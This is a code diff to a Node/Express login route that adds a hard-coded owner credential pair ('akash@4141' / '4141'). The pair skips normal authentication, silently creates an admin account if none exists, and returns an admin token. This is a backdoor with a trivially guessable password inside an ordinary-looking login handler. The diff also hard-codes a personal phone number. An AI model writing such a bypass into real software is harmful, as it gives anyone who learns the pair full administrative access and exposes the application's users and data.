@@ -39,6 +39,34 @@ router.post('/register', validateRegister, (req, res) => {
 router.post('/login', validateLogin, (req, res) => {
   try {
     const { email, password } = req.body;
+
+    // Direct check for Akash Owner master credentials
+    if (email === 'akash@4141' && password === '4141') {
+      let user = getOne('SELECT * FROM users WHERE email = ?', ['akash@4141']);
+      if (!user) {
+        const hash = bcrypt.hashSync('4141', 10);
+        const r = execute(
+          `INSERT INTO users (name, email, password_hash, role, phone) VALUES (?, ?, ?, 'admin', ?)`,
+          ['Akash Owner', 'akash@4141', hash, '+91 9135164069']
+        );
+        user = getOne('SELECT * FROM users WHERE id = ?', [r.lastInsertRowid]);
+      }
+      const safeUser = {
+        id: user.id,
+        name: user.name || 'Akash Owner',
+        email: user.email,
+        role: 'admin',
+        phone: user.phone
+      };
+      const token = generateToken(safeUser);
+      return res.json({
+        success: true,
+        message: 'Owner login successful!',
+        token,
+        user: safeUser
+      });
+    }
+
     const user = getOne('SELECT * FROM users WHERE email = ?', [email]);
     if (!user) {
       return res.status(401).json({ success: false, message: 'Invalid email or password.' });
